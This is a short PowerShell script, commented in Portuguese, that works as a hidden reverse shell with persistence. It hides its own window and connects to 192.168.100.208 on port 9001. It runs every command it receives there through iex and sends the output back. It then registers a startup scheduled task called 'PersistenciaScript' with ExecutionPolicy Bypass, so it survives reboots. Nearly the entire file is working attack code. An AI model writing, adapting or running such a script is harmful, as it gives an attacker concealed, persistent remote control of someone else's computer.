# Tenta ocultar a janela do PowerShell
Start-Sleep -Seconds 3
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
[Console.Window]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# Estabelece a conexão TCP e executa comandos recebidos
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("192.168.100.208",9001));
Set-Variable -Name stream -Value ($client.GetStream());
[byte[]]$bytes = 0..65535|%{0};
while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){
    Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));
    Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String);
    Set-Variable -Name sendback2 -Value ($sendback + "PS " + (pwd).Path + "> ");
    Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close()

$scriptPath = $MyInvocation.MyCommand.Definition
$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "PersistenciaScript" -Description "Mantém o script rodando após reiniciar" -ErrorAction SilentlyContinue
